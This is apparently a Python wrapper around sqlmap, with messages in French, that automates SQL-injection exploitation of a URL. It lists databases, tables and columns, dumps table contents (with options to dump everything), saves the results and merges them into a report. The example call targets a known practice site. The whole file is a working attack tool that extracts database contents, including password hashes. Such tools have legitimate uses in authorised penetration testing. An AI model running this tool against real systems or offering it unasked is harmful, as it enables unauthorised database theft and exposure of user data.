import subprocess
import re
import os
from glob import glob

def run_sqlmap_dbs(url):
    cmd = ["sqlmap", "-u", url, "--batch", "--dbs"]
    print("Commande exécutée :\n", " ".join(cmd))
    print("=" * 60)
    try:
        result = subprocess.run(cmd, capture_output=True, text=True, check=True)
        print(result.stdout)
        print("=" * 60)
        databases = [db for db in re.findall(r"\[\*\] ([a-zA-Z0-9_]+)", result.stdout)
                     if db.lower() not in {"starting", "ending"}]
        return databases
    except subprocess.CalledProcessError as e:
        print("Erreur SQLMap (dbs) :", e.stdout or e.stderr)
        return []

def run_sqlmap_tables(url, database_name):
    cmd = ["sqlmap", "-u", url, "-D", database_name, "--tables", "--batch"]
    print(f"\nCommande exécutée pour les tables de '{database_name}' :\n", " ".join(cmd))
    print("=" * 60)
    try:
        result = subprocess.run(cmd, capture_output=True, text=True, check=True)
        print(result.stdout)
        print("=" * 60)
        tables = [
            line.strip().strip('|').strip()
            for line in result.stdout.splitlines()
            if line.strip().startswith('|') and line.strip().count('|') == 2 and '-' not in line
        ]
        os.makedirs("results/table", exist_ok=True)
        with open(f"results/table/table_{database_name}.txt", "w", encoding="utf-8") as f:
            f.write(f"Tables de la base de données : {database_name}\n")
            for table in tables:
                f.write(f"- {table}\n")
        return tables
    except subprocess.CalledProcessError as e:
        print(f"Erreur SQLMap (tables) pour '{database_name}' :", e.stdout or e.stderr)
        return []

def run_sqlmap_columns(url, database_name, table_name):
    cmd = ["sqlmap", "-u", url, "-D", database_name, "-T", table_name, "--columns", "--batch"]
    print(f"\n📌 Commande exécutée pour les colonnes de '{database_name}.{table_name}' :\n", " ".join(cmd))
    print("=" * 60)
    try:
        result = subprocess.run(cmd, capture_output=True, text=True, check=True)
        print(result.stdout)
        print("=" * 60)
        columns = re.findall(r"\| ([a-zA-Z0-9_]+) \| [a-zA-Z0-9()]+ \|", result.stdout)
        os.makedirs("results/columns", exist_ok=True)
        with open(f"results/columns/columns_{database_name}_{table_name}.txt", "w", encoding="utf-8") as f:
            for column in columns:
                f.write(f"{column}\n")
        return columns
    except subprocess.CalledProcessError as e:
        print(f"❌ Erreur SQLMap (columns) pour '{database_name}.{table_name}' :")
        print(e.stdout or e.stderr)
        return []

def run_sqlmap_dump_table(url, database_name, table_name):
    cmd = ["sqlmap", "-u", url, "-D", database_name, "-T", table_name, "--dump", "--batch"]
    print(f"\n📥 Dump de '{database_name}.{table_name}' :\n", " ".join(cmd))
    print("=" * 60)
    try:
        result = subprocess.run(cmd, capture_output=True, text=True, check=True)
        cleaned_output = []
        for line in result.stdout.splitlines():
            line_lower = line.lower().strip()
            if any([
                "do you want to store hashes" in line_lower,
                "do you want to crack them" in line_lower,
                "do you want to use common password suffixes" in line_lower,
                "what dictionary do you want to use" in line_lower,
                "[info] using hash method" in line_lower,
                "[info] using default dictionary" in line_lower,
                "recognized possible password hashes" in line_lower,
                line_lower.startswith("[1]"),
                line_lower.startswith("[2]"),
                line_lower.startswith("[3]"),
                line_lower.startswith("> "),
                re.match(r"\[\d{2}:\d{2}:\d{2}\] \[info\]", line_lower)
            ]):
                continue
            cleaned_output.append(line)
        final_output = "\n".join(cleaned_output)
        print(final_output)
        print("=" * 60)
        os.makedirs("results/dump", exist_ok=True)
        with open(f"results/dump/dump_{database_name}_{table_name}.txt", "w", encoding="utf-8") as f:
            f.write(final_output)
    except subprocess.CalledProcessError as e:
        print(f"❌ Erreur SQLMap (dump) pour '{database_name}.{table_name}' :")
        print(e.stdout or e.stderr)
def encadrer_texte(texte):
    longueur = len(texte)
    print("+" + "-" * (longueur + 2) + "+")
    print("| " + texte + " |")
    print("+" + "-" * (longueur + 2) + "+")
    
def fusionner_rapport_complet(domain, selected_db):
    try:
        rapport_path = f"results/rapport_sqlmc_{domain}.txt"
        database_path = "results/database/database.txt"
        table_path = f"results/table/table_{selected_db}.txt"
        output_path = "results/rapport_SQL.txt"
        titre = "Rapport de scan"
        bordure = "+" + "-" * (len(titre) + 2) + "+\n"
        ligne = "| " + titre + " |\n"
        encadre = bordure + ligne + bordure
        
        with open(output_path, "w", encoding="utf-8") as fout:
            fout.write("=== RAPPORT SQLMC COMPLET ===\n\n")

            # Rapport de scan
            if os.path.exists(rapport_path):
                #fout.write(">>> Rapport de scan :\n")
                fout.write(encadre)
                with open(rapport_path, "r", encoding="utf-8") as f:
                    fout.write(f.read())
                fout.write("\n" + "="*60 + "\n\n")


            # Fichier database
            titre1 = "Bases de données détectées"
            bordure1 = "+" + "-" * (len(titre1) + 2) + "+\n"
            ligne1 = "| " + titre1 + " |\n"
            encadre1 = bordure1 + ligne1 + bordure1
            #fout.write(">>> Bases de données détectées :\n")
            fout.write(encadre1)
            with open(database_path, "r", encoding="utf-8") as f:
                fout.write(f.read())
            fout.write("\n" + "="*60 + "\n\n")

            # Fichier table
            titre2 = "Tables extraites"
            bordure2 = "+" + "-" * (len(titre2) + 2) + "+\n"
            ligne2 = "| " + titre2 + " |\n"
            encadre2 = bordure2 + ligne2 + bordure2
            #fout.write(">>> Tables extraites :\n")
            fout.write(encadre2)
            with open(table_path, "r", encoding="utf-8") as f:
                fout.write(f.read())
            fout.write("\n" + "="*60 + "\n\n")

            

            # Dumps
            #fout.write(">>> Dumps extraits :\n")
            titre3 = "Dumps extraits"
            bordure3 = "+" + "-" * (len(titre3) + 2) + "+\n"
            ligne3 = "| " + titre3 + " |\n"
            encadre3 = bordure3 + ligne3 + bordure3
            fout.write(encadre3)
            for dump_file in glob(f"results/dump/dump_{selected_db}_*.txt"):
                fout.write(f"\n-- {os.path.basename(dump_file)} --\n")
                with open(dump_file, "r", encoding="utf-8") as f:
                    fout.write(f.read())
            fout.write("\n")
        print(f"\n✅ Rapport fusionné enregistré dans : {output_path}")
    except Exception as e:
        print(f"❌ Erreur de fusion : {str(e)}")

def sqlmap(url):
    domain = url.split("//")[1].split("/")[0].replace(":", "_")
    databases = run_sqlmap_dbs(url)
    if not databases:
        print("❌ Aucune base trouvée.")
        return

    os.makedirs("results/database", exist_ok=True)
    with open("results/database/database.txt", "w", encoding="utf-8") as f:
        f.write("Bases de données trouvées :\n")
        for db in databases:
            f.write(f"- {db}\n")

    print("\n📚 Bases de données disponibles :")
    for i, db in enumerate(databases):
        print(f"[{i}] {db}")
    print("[a] Tout dumper")

    choice = input("\n👉 Choisissez une base (ou 'a' pour tout dumper) : ").strip().lower()

    if choice == "a":
        os.makedirs("results/table", exist_ok=True)
        for selected_db in databases:
            print(f"\n🔍 Traitement de la base : {selected_db}")
            with open("results/database/database.txt", "a", encoding="utf-8") as f:
                f.write(f"\nBase sélectionnée : {selected_db}\n")

            tables = run_sqlmap_tables(url, selected_db)
            if not tables:
                print(f"❌ Aucune table trouvée dans '{selected_db}'")
                continue

            table_file_path = f"results/table/table_{selected_db}.txt"
            with open(table_file_path, "a", encoding="utf-8") as f:
                f.write("\nTable sélectionnée : toutes les tables\n")

            for tbl in tables:
                run_sqlmap_columns(url, selected_db, tbl)
                run_sqlmap_dump_table(url, selected_db, tbl)

            fusionner_rapport_complet(domain, selected_db)
        return

    elif choice.isdigit() and int(choice) < len(databases):
        selected_db = databases[int(choice)]

        with open("results/database/database.txt", "a", encoding="utf-8") as f:
            f.write(f"\nBase sélectionnée : {selected_db}\n")

        tables = run_sqlmap_tables(url, selected_db)
        if not tables:
            print(f"❌ Aucune table trouvée dans '{selected_db}'")
            return

        print(f"\n📄 Tables dans '{selected_db}' :")
        for i, tbl in enumerate(tables):
            print(f"[{i}] {tbl}")
        print("[a] Dumper toutes les tables")

        tbl_choice = input("\n👉 Choisissez une table (ou 'a' pour tout dumper) : ").strip().lower()
        os.makedirs("results/table", exist_ok=True)
        table_file_path = f"results/table/table_{selected_db}.txt"
        with open(table_file_path, "a", encoding="utf-8") as f:
            if tbl_choice == "a":
                f.write("\nTable sélectionnée : toutes les tables\n")
            elif tbl_choice.isdigit() and int(tbl_choice) < len(tables):
                f.write(f"\nTable sélectionnée : {tables[int(tbl_choice)]}\n")
            else:
                f.write("\nTable sélectionnée : aucune (choix invalide)\n")

        if tbl_choice == "a":
            for tbl in tables:
                run_sqlmap_columns(url, selected_db, tbl)
                run_sqlmap_dump_table(url, selected_db, tbl)
        elif tbl_choice.isdigit() and int(tbl_choice) < len(tables):
            selected_tbl = tables[int(tbl_choice)]
            run_sqlmap_columns(url, selected_db, selected_tbl)
            run_sqlmap_dump_table(url, selected_db, selected_tbl)
        else:
            print("❌ Choix invalide pour les tables.")

        fusionner_rapport_complet(domain, selected_db)
    else:
        print("❌ Choix invalide pour la base.")

# Exemple d’appel :
# sqlmap("http://testphp.vulnweb.com/artists.php?artist=1")
